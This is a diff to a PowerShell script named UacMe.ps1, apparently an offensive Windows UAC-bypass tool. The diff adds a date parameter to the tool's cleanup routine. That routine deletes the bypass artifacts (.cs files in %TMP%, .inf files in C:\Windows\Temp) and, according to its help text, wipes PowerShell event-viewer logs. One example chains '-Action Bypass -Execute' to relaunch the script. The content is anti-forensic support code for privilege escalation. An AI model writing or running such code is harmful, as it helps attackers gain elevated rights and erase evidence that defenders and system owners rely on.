@@ -19,6 +19,9 @@
 .Parameter Execute
    Accepts the command\appl to be executed! (cmd|powershell)
 
+.Parameter Date
+   Delete artifacts left behind by is 'CreationDate'
+
 .EXAMPLE
    PS C:\> Get-Help .\UacMe.ps1 -full
    Access this cmdlet comment based help
@@ -43,6 +46,10 @@
    PS C:\> .\UacMe.ps1 -Action Clean
    Deletes uac bypass artifacts and powershell eventvwr logs!
    Remark: Admin privileges are required to delete PS logfiles.
+
+.EXAMPLE
+   PS C:\> .\UacMe.ps1 -Action Clean -Date "19/04/2021"
+   Clean ALL artifacts left behind by this cmdlet by is 'CreationDate'
 
 .INPUTS
    None. You cannot pipe objects into UacMe.ps1
@@ -73,7 +80,8 @@
 ## Non-Positional cmdlet named parameters
 [CmdletBinding(PositionalBinding=$false)] param(
    [string]$Execute="$PsHome\powershell.exe",
-   [string]$Action="False"
+   [string]$Action="False",
+   [string]$Date="false"
 )
 
 
@@ -321,7 +329,11 @@ If($Action -ieq "Clean"){
    .EXAMPLE
       PS C:\> .\UacMe.ps1 -Action Clean
       Clean ALL artifacts left behind by this cmdlet and deletes eventvwr
-      powershell logfiles if this cmdlet its executed with admin privileges! 
+      powershell logfiles if this cmdlet its executed with admin privileges!
+
+   .EXAMPLE
+      PS C:\> .\UacMe.ps1 -Action Clean -Date "19/04/2021"
+      Clean ALL artifacts left behind by this cmdlet by is 'CreationDate'
       
    .EXAMPLE
       PS C:\> .\UacMe.ps1 -Action Bypass -Execute "powershell -file $Env:TMP\UacMe.ps1 -Action Clean"
@@ -353,11 +365,14 @@ If($Action -ieq "Clean"){
    }
 
 
+   If($Date -ieq "false"){## Gets today date
+      $Date = Get-date -Format "dd/MM/yyyy" ## Get todays date: 19/04/2021   
+   }
+
    ## This function deletes ALL .cs files from '%tmp%'
    # directory. If the 'CreationTime' of the files Matches todays date!
-   $TodaysSc = Get-date -Format "dd/MM/yyyy" ## Get todays date: 19/04/2021
    $CleanInf = (Get-ChildItem -Path "$Env:TMP" | Where-Object { 
-      $_.CreationTime.ToString() -Match "$TodaysSc" -and $_.Name -Match '(.cs)$' 
+      $_.CreationTime.ToString() -Match "$Date" -and $_.Name -Match '(.cs)$' 
    }).FullName
    ForEach($Item in $CleanInf){## Delete ALL .cs files found from &tmp%
       Remove-Item -Path "$Item" -EA SilentlyContinue -Force
@@ -368,7 +383,7 @@ If($Action -ieq "Clean"){
    ## This function deletes ALL .inf files from 'C:\Windows\Temp'
    # directory. If the 'CreationTime' of the files Matches todays date!
    $CleanInf = (Get-ChildItem -Path "$Env:WINDIR\temp" | Where-Object { 
-      $_.CreationTime.ToString() -Match "$TodaysSc" -and $_.Name -Match '(.inf)$' 
+      $_.CreationTime.ToString() -Match "$Date" -and $_.Name -Match '(.inf)$' 
    }).FullName
    ForEach($Item in $CleanInf){## Delete ALL .inf files found from C:\Windows\Temp dir!
       Remove-Item -Path "$Item" -EA SilentlyContinue -Force
